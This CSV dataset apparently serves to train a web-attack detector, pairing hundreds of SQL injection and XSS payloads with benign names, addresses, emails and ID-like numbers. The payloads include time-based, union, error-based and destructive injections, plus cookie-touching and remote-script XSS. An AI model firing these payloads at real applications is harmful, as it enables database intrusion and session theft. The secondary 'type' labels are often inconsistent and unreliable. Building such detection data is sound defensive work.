Text,attack_type,Label,type
(case when 6398=6398 then 1 else null end),sqli,1,normal
"1"")) or sleep(5) and ((""mtmb"" like ""mtmb",sqli,1,normal
poulsen,norm,0,normal
"1'||(select 'pmpd' where 9803=9803;call regexp_substring(repeat(right(char(3702),0),500000000),null))||'",sqli,1,sql
serene,norm,0,normal
"-2216)) as hxmq where 5677=5677 union all select 5677,5677--",sqli,1,sql
puvilom@vitalhome.wf,norm,0,normal
coyne-rabasa@intercambioenlaces.do,norm,0,normal
"-2001'+(select 'nput' where 8368=8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",sqli,1,sql
"1) as qyic where 9736=9736 and elt(3114=3114,sleep(5))#",sqli,1,normal
"1%"" rlike (select (case when (5135=9839) then 1 else 0x28 end)) and ""%""=""",sqli,1,sql
"1"" where 8697=8697 and elt(3114=3114,sleep(5))#",sqli,1,normal
"1'))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
1'+(select rhlb where 9477=9477;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
sincr5nica,norm,0,normal
22470,norm,0,normal
"tratado de niza, 96",norm,0,normal
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('khah' like 'khah",sqli,1,sql
billotea0,norm,0,normal
"1%""))) union all select null,null,null,null,null--",sqli,1,sql
"1') and elt(3114=3114,sleep(5))#",sqli,1,normal
calle correa de arauxo 176,norm,0,normal
81568460h,norm,0,normal
9690868627126482,norm,0,normal
"calle isla de la toja 84,",norm,0,normal
"-8245"")) or 3038=3038",sqli,1,normal
1' in boolean mode) rlike (select * from (select(sleep(5)))sgvo)#,sqli,1,sql
22373,norm,0,normal
"1%"") or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null)",sqli,1,sql
retuerta fong,norm,0,normal
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'fjfo'='fjfo",sqli,1,normal
"1'+(select 'drqj' where 1246=1246;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
"-9015%"") union all select 6948,6948--",sqli,1,sql
"1 where 3902=3902 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1"") where 2656=2656 or sleep(5)--",sqli,1,sql
3578,norm,0,normal
katy,norm,0,normal
ariel,norm,0,normal
castellgal,norm,0,normal
rube,norm,0,normal
persson_mcclanahan@deseoun.km,norm,0,normal
inistola,norm,0,normal
"c/ gamos 5, 11-h",norm,0,normal
salvi figuls,norm,0,normal
0600142480531797,norm,0,normal
19846981m,norm,0,normal
"1"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""jcyh""=""jcyh",sqli,1,sql
reaves-phillips@baybay.tm,norm,0,normal
95843081b,norm,0,normal
or5i6or6i686,norm,0,normal
"1"" where 3678=3678 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
33245427p,norm,0,normal
60586849l,norm,0,normal
faci59ado,norm,0,normal
23683952r,norm,0,normal
sparksma,norm,0,normal
-1217'))) order by 1#,sqli,1,normal
"1)) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((3003=3003",sqli,1,sql
farhan,norm,0,normal
-8513' union all select 7414--,sqli,1,sql
atos,norm,0,normal
griffith_chesbro@psykoterapeut.sn,norm,0,normal
altaira,norm,0,normal
cutillas,norm,0,normal
"-6680""))) union all select 2564,2564,2564,2564,2564,2564#",sqli,1,sql
kwang-ch,norm,0,normal
81506228r,norm,0,normal
1' in boolean mode);(select * from (select(sleep(5)))acdk)#,sqli,1,sql
"1%""))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((""%""=""",sqli,1,normal
1') as jztg where 1222=1222 or sleep(5)#,sqli,1,normal
"1'+(select ocvc where 6981=6981 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1'+(select dklk where 9862=9862 union all select null,null,null,null,null,null--",sqli,1,sql
shiner-rangda@guerrerodelbienestar.cr,norm,0,normal
rigoberta menchu 184 10?d,norm,0,normal
juana,norm,0,normal
zarrapastrosamente,norm,0,normal
vari1l8,norm,0,normal
"1)) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((8554=8554",sqli,1,normal
"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('eflk'='eflk",sqli,1,sql
"-3116)) as jyiq where 3875=3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",sqli,1,sql
03837,norm,0,normal
1' where 2911=2911;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
8259767534834623,norm,0,normal
"1"");select case when 7717=7717 then 1 else null end--",sqli,1,sql
harmonia 120,norm,0,normal
13194,norm,0,normal
"1"") as jtou where 8129=8129 and 7533=7533--",sqli,1,sql
alarba,norm,0,normal
42782721f,norm,0,normal
16650765f,norm,0,normal
casas de bentez,norm,0,normal
leonila,norm,0,normal
"1"")) as whyr where 9731=9731 rlike (select * from (select(sleep(5)))sgvo)--",sqli,1,sql
"1'+(select pxsd where 2576=2576 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))+'",sqli,1,sql
36746323m,norm,0,normal
1 where 4245=4245;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
"-8976%""))) union all select 5146,5146,5146,5146,5146,5146,5146,5146--",sqli,1,sql
03t86i3,norm,0,normal
"-4964"")) union all select 4750,4750,4750,4750,4750--",sqli,1,sql
"1))) and 8407=(select count(*) from generate_series(1,5000000)) and (((1729=1729",sqli,1,sql
rufil,norm,0,normal
"alt=alert(1)//"">",xss,2,normal
44251271f,norm,0,normal
barber,norm,0,normal
1'+(select 'czpg' where 6627=6627 and 2006=2006,sqli,1,sql
mcdonald,norm,0,normal
"riba, la",norm,0,normal
fady,norm,0,normal
"1 where 8135=8135;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"avinguda francesc macia., 30 3?b",norm,0,normal
smithdea,norm,0,normal
"1%"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",sqli,1,sql
"-9659))) union all select 8665,8665,8665,8665,8665,8665,8665--",sqli,1,sql
0466431001368094,norm,0,normal
walkins,norm,0,normal
"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",sqli,1,sql
harmony,norm,0,normal
"plaza museo, 45, 6e",norm,0,normal
"-2373%"") or 9323=9323#",sqli,1,normal
0222583632895914,norm,0,normal
"1"")) as pafp where 6770=6770 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
mattos@velazquezlarraaga.dd,norm,0,normal
5693419988123325,norm,0,normal
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'ccsb'='ccsb",sqli,1,sql
95!6a752a,norm,0,normal
sant esteve sesrovires,norm,0,normal
"1'||(select 'rfjl' where 2476=2476 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",sqli,1,sql
z4rce7a,norm,0,normal
1')));select (case when (6969=5797) then 6969 else 6969*(select 6969 from information_schema.character_sets) end)#,sqli,1,sql
99eja36r9a,norm,0,normal
in08i28aci30,norm,0,normal
pavan@phd-photodecor.in,norm,0,normal
samia,norm,0,normal
"1' and make_set(4952=7129,7129)",sqli,1,normal
muthuswa,norm,0,normal
55235483v,norm,0,normal
aula,norm,0,normal
"1) where 7684=7684 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1%"");select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
famery@noticiasenvivo.ie,norm,0,normal
noami,norm,0,normal
"1') where 2802=2802 union all select null,null,null#",sqli,1,sql
poemtico,norm,0,normal
"1) as qjbd where 2808=2808 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,sql
"1')) as jpxj where 6153=6153 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
montaa baltans,norm,0,normal
48di48l92,norm,0,normal
8417338456175136,norm,0,normal
46194,norm,0,normal
"1"") where 3058=3058 union all select null--",sqli,1,sql
"1"" or elt(6272=6272,sleep(5)) and ""hvic"" like ""hvic",sqli,1,normal
camponaraya,norm,0,normal
00207473j,norm,0,normal
"-3860' union all select 3510,3510,3510#",sqli,1,sql
desamueblar,norm,0,normal
"jesus jimenez, 86,",norm,0,normal
"1"" or (select * from (select(sleep(5)))ydpu) and ""pxix""=""pxix",sqli,1,sql
45789,norm,0,normal
1')));select (case when (5768=9169) then 5768 else 1/(select 0) end)--,sqli,1,sql
"1') where 8948=8948 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
3644619165176311,norm,0,normal
"1"")) as jrld where 3488=3488;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
85533864s,norm,0,normal
sol sieso,norm,0,normal
"passeig pavello albeniz, 12,",norm,0,normal
torell berber,norm,0,normal
vies canales,norm,0,normal
cerralbo,norm,0,normal
1'+(select 'lpkv' where 8760=8760;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
"1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",sqli,1,sql
"burguerins, 82,",norm,0,normal
51804577k,norm,0,normal
1' where 9416=9416;begin user_lock.sleep(5); end--,sqli,1,sql
calle lindachiquia 141 3?e,norm,0,normal
-5982' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'ikuh'='ikuh,sqli,1,sql
6256718045061012,norm,0,normal
yn,norm,0,normal
"1"") as wmng where 5976=5976;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
galligan@bijoubijoudiferente.vg,norm,0,normal
luisn,norm,0,normal
clarette,norm,0,normal
"1,(convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4932=4932) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))",sqli,1,sql
"<iframe srcdoc=""<img src=x:x onerror=alert(1)>"" />",xss,2,xss
"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and 'ibdj'='ibdj",sqli,1,sql
"<layer src=""http://vulnerability-lab.com/script.html""></layer>",xss,2,normal
aurora bertrana salazar 10 3-c,norm,0,normal
47680,norm,0,normal
sprayber,norm,0,normal
calle gurugu 142 4?d,norm,0,normal
lian,norm,0,normal
"1"") as advz where 5166=5166 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"-5606)) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
cobo,norm,0,normal
3933219208280602,norm,0,normal
steinar,norm,0,normal
inobediecia,norm,0,normal
1864402022200871,norm,0,normal
37793,norm,0,normal
merkling,norm,0,normal
"-1139) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
pilapil@espaciopintor.my,norm,0,normal
"1%"")));select (case when (4996=1734) then 1 else 4996*(select 4996 from master..sysdatabases) end)--",sqli,1,sql
kitaen5@lawn.vn,norm,0,normal
estate,norm,0,normal
85521250m,norm,0,normal
m0nuta9,norm,0,normal
san bartolom de las abiertas,norm,0,normal
"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""nrhz"" like ""nrhz",sqli,1,sql
coralie,norm,0,normal
3074429999083032,norm,0,normal
"1',(select (case when (6560=2813) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,1,sql
echarri,norm,0,normal
4935554028654452,norm,0,normal
4857,norm,0,normal
patorzinski@filtraciondehumos.hr,norm,0,normal
belalczar,norm,0,normal
crmenes,norm,0,normal
trincha-32r1,norm,0,normal
"1'))) union all select null,null--",sqli,1,sql
"1"";(select * from (select(sleep(5)))srmq)",sqli,1,sql
6679885410766577,norm,0,normal
lachens@prestoesesto.py,norm,0,normal
fornelos de montes,norm,0,normal
4881,norm,0,normal
450,norm,0,normal
"1%') or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
42798379w,norm,0,normal
84125384d,norm,0,normal
westfall,norm,0,normal
ronet_huebner@nikemujeres.bm,norm,0,normal
"1"";(select * from (select(sleep(5)))acdk)#",sqli,1,sql
1) as mtda where 3951=3951;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
"-5996) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
7009,norm,0,normal
43774,norm,0,normal
"<iframe src=""javascript:document.cookie=true;""></iframe>",xss,2,xss
woronov@connect.gr,norm,0,normal
zwi,norm,0,normal
"-4822"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""owbp""=""owbp",sqli,1,sql
"tres villas, las",norm,0,normal
terl6z,norm,0,normal
orazio,norm,0,normal
1)));select case when 7717=7717 then 1 else null end--,sqli,1,sql
"1"")) as dksq where 7161=7161;iif(5257=5257,1,1/0)",sqli,1,sql
"-6388'+(select 'jqld' where 8600=8600 union all select 8600,8600#",sqli,1,sql
90658868k,norm,0,normal
<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>,xss,2,sql
macdougall_laurier@rocofer.am,norm,0,normal
2888,norm,0,normal
c1l674n,norm,0,normal
"1'));iif(5257=5257,1,1/0)",sqli,1,sql
"<div id=xss style=""width: expression(alert('xss'));"">",xss,2,sql
"guardia, la",norm,0,normal
1%';select (case when (1407=2741) then 1407 else 1407*(select 1407 from mysql.db) end)#,sqli,1,sql
8505,norm,0,normal
babilas,norm,0,normal
8326141547735911,norm,0,normal
"-8355%""))) union all select 3004,3004,3004,3004,3004,3004,3004--",sqli,1,sql
98p+e,norm,0,normal
ch35isca,norm,0,normal
e561o,norm,0,normal
37246742j,norm,0,normal
"1 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
vilamasa pacheca,norm,0,normal
enconrea7,norm,0,normal
tableo,norm,0,normal
23266,norm,0,normal
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)",sqli,1,sql
"1"") as esks where 1138=1138;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
44370,norm,0,normal
"1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""jcgh""=""jcgh",sqli,1,sql
sayle@miemail.com.ic,norm,0,normal
5118232940986144,norm,0,normal
"1"")) rlike sleep(5) and ((""ahhx"" like ""ahhx",sqli,1,normal
1')) as gchn where 5856=5856;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
anamary,norm,0,normal
cervera del ro alhama,norm,0,normal
"jose muoz san roman, s/n,",norm,0,normal
"1') as qaec where 6572=6572 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""hhwy""=""hhwy",sqli,1,normal
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'nelb'='nelb",sqli,1,normal
"1%"");select sleep(5) and (""%""=""",sqli,1,sql
"1%""))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
61621455q,norm,0,normal
70136564l,norm,0,normal
6398147509756321,norm,0,normal
hernani,norm,0,normal
8691836176757675,norm,0,normal
am6456ra,norm,0,normal
5302,norm,0,normal
1')) as zbkp where 1720=1720 and 4110=6748#,sqli,1,normal
colera,norm,0,normal
hallenbe,norm,0,normal
23il04,norm,0,normal
chuck,norm,0,normal
09540,norm,0,normal
matie,norm,0,normal
68438440p,norm,0,normal
"calle artigako haritza, s/n 8?d",norm,0,normal
"1%"")) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((""%""=""",sqli,1,sql
agn,norm,0,normal
"1"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""vnei"" like ""vnei",sqli,1,normal
valdelosa,norm,0,normal
corsini-vischer@viajesdacapalla.nl,norm,0,normal
villalba de los alcores,norm,0,normal
"1"";select pg_sleep(5)",sqli,1,sql
-5751) as jybu where 4739=4739 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
"1 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
cojera,norm,0,normal
94318165h,norm,0,normal
16315,norm,0,normal
1 where 6304=6304;begin dbms_lock.sleep(5); end--,sqli,1,sql
14640,norm,0,normal
zarraga,norm,0,normal
baarova@hrmsl.mil,norm,0,normal
50835477a,norm,0,normal
"1 where 9072=9072 and elt(4249=4249,7259)--",sqli,1,sql
"1"") or sleep(5) and (""xgtk""=""xgtk",sqli,1,normal
cuartelar,norm,0,normal
pomeroy5,norm,0,normal
refriega,norm,0,normal
"1' and elt(4249=4249,7259) and 'pgvz'='pgvz",sqli,1,normal
"1%')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('%'='",sqli,1,sql
spaeth@directoriogratuito.kr,norm,0,normal
alesis,norm,0,normal
96305711l,norm,0,normal
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'),sqli,1,sql
ulldemolins,norm,0,normal
capella,norm,0,normal
chao-pin2,norm,0,normal
woodburn@vinavilano.hr,norm,0,normal
"1"") and 2954=1256--",sqli,1,sql
<script>a=/crosssitescripting/ alert(a.source)</script>,xss,2,xss
roccardi.betten@carrillo-de-albornoz.mil,norm,0,normal
"1'+(select rwse where 9843=9843 union all select null,null,null,null,null,null,null--",sqli,1,sql
7011,norm,0,normal
"1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""ureu"" like ""ureu",sqli,1,sql
-2658) as casi where 7364=7364 or 8245=9651--,sqli,1,sql
"-7065'+(select 'bdxr' where 1756=1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",sqli,1,sql
borque clua,norm,0,normal
4162370064639312,norm,0,normal
-6802) as coyv where 5693=5693 or 8571=8571--,sqli,1,sql
23,norm,0,normal
vega del codorno,norm,0,normal
31819774x,norm,0,normal
"1%')) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
1'+(select 'xbyn' where 6881=6881;begin user_lock.sleep(5); end)+',sqli,1,sql
blakley@asyra.ao,norm,0,normal
kipp,norm,0,normal
saliva+jo,norm,0,normal
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('lwyo'='lwyo",sqli,1,sql
eastman@beesmer.lu,norm,0,normal
47173,norm,0,normal
"1%';iif(5257=5257,1,1/0)",sqli,1,sql
1)) as izvy where 2569=2569;begin user_lock.sleep(5); end--,sqli,1,sql
4190369223587522,norm,0,normal
integrat,norm,0,normal
"1"" where 5440=5440 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
detlev,norm,0,normal
-3648' where 4629=4629 order by 1--,sqli,1,sql
"1""));select sleep(5) and ((""vzye""=""vzye",sqli,1,sql
"-8034"" or 8571=8571--",sqli,1,sql
33279,norm,0,normal
ma$c3donio,norm,0,normal
keen,norm,0,normal
07789163y,norm,0,normal
"1')) as myws where 5274=5274;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
1728750094813990,norm,0,normal
35866862h,norm,0,normal
"-8487') where 9655=9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",sqli,1,sql
"1"") where 5298=5298 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,1,sql
burgoa planells,norm,0,normal
young-ba,norm,0,normal
ermin,norm,0,normal
spinnell@cpanelweb.com.ao,norm,0,normal
licia,norm,0,normal
comprensin,norm,0,normal
"calle perez galdos 193,",norm,0,normal
"1%"" union all select null,null--",sqli,1,sql
"1' in boolean mode);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
marciniu,norm,0,normal
"1"")) as wooq where 7671=7671 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1,sql
dao,norm,0,normal
15618,norm,0,normal
6861,norm,0,normal
1' in boolean mode);select (case when (2717=2634) then 2717 else 2717*(select 2717 from mysql.db) end)#,sqli,1,sql
corazones 168,norm,0,normal
escritor lopez de cardenas 76 12e,norm,0,normal
marbella,norm,0,normal
l1b6855ca30e,norm,0,normal
07953,norm,0,normal
perales salmern,norm,0,normal
"c/ tamarindo, 109 9e",norm,0,normal
"-5438"") union all select 3170,3170--",sqli,1,sql
"<xml id=xss><x><c><![cdata[<img id=xss src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x><xml><span dataid=xss src=#i datafld=cdataformatas=html></span>",xss,2,sql
curtis,norm,0,normal
"1"" where 9919=9919;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"<img src=javascript:alert(string.fromcharcode(88,83,83))>",xss,2,xss
buch als,norm,0,normal
5746287514997171,norm,0,normal
escarpelo,norm,0,normal
chisvert,norm,0,normal
"1) as ndgd where 2367=2367 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
18339,norm,0,normal
"1"") as uuth where 8555=8555 union all select null,null#",sqli,1,sql
allaert@chicasdiabolo.ru,norm,0,normal
75p80ica,norm,0,normal
"del almendro, 169,",norm,0,normal
1 where 5700=5700;select pg_sleep(5)--,sqli,1,sql
"1',(select (case when (9443=9443) then sleep(5) else 9443*(select 9443 from information_schema.character_sets) end))",sqli,1,sql
31096,norm,0,normal
travesia poeta noriega varela 118 13f,norm,0,normal
difusora,norm,0,normal
pospalatal,norm,0,normal
diviu sauleda,norm,0,normal
"de la coma, 112 4-b",norm,0,normal
comparendo,norm,0,normal
7549,norm,0,normal
1') where 5331=5331;begin dbms_lock.sleep(5); end--,sqli,1,sql
arles,norm,0,normal
psicos-is,norm,0,normal
"1%""))) union all select null,null,null,null,null,null,null#",sqli,1,sql
"1""""(.'.(,(.",sqli,1,normal
"avenida rafael cabrera, 24, 8?g",norm,0,normal
"-9434"") as cqlw where 1600=1600 or 2733=1047--",sqli,1,sql
50366,norm,0,normal
sel,norm,0,normal
donner.vai@barcafedaniss.wf,norm,0,normal
matula,norm,0,normal
"1'+(select zbyt where 4575=4575 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))+'",sqli,1,sql
9210476335859924,norm,0,normal
"1"") as lexx where 2892=2892 or elt(6272=6272,sleep(5))--",sqli,1,sql
fal429a,norm,0,normal
9448799154735544,norm,0,normal
takahash,norm,0,normal
"1) or elt(6272=6272,sleep(5))",sqli,1,normal
eneas,norm,0,normal
1%'));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
villatobas,norm,0,normal
calle laujar 42,norm,0,normal
"plza. fuentes claras, 74",norm,0,normal
"1"")) as xcyo where 2929=2929;select sleep(5)--",sqli,1,sql
"1%"")) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",sqli,1,sql
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('bzak' like 'bzak",sqli,1,sql
4824513901860382,norm,0,normal
"1"" where 4366=4366 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"calle paz, s/n",norm,0,normal
monelli@carimartin.gd,norm,0,normal
backes@kimkardashian.com.lk,norm,0,normal
forns rigall,norm,0,normal
"c/ misericordia, 57 7-h",norm,0,normal
17485,norm,0,normal
50629,norm,0,normal
feld_zaleska@laschinas.pl,norm,0,normal
"1%"")));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
1 and 5934=7745,sqli,1,normal
leonard,norm,0,normal
29456732b,norm,0,normal
"1%"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
95372776x,norm,0,normal
16707,norm,0,normal
milmarcos,norm,0,normal
"1"") order by 1--",sqli,1,sql
"calle calderon de la barca, 141",norm,0,normal
0614375180233873,norm,0,normal
"1""))) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
41022572w,norm,0,normal
once s/n,norm,0,normal
"<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>",xss,2,sql
"microscopio, 65",norm,0,normal
p6r23i.co,norm,0,normal
"-1891' in boolean mode) union all select 6680,6680,6680,6680,6680,6680,6680,6680#",sqli,1,sql
40a5e,norm,0,normal
6986219017290364,norm,0,normal
villanueva del fresno,norm,0,normal
16316,norm,0,normal
"1,(select (case when (1609=1609) then waitfor delay '0:0:5' else 1609*(select 1609 from master..sysdatabases) end))",sqli,1,sql
05153,norm,0,normal
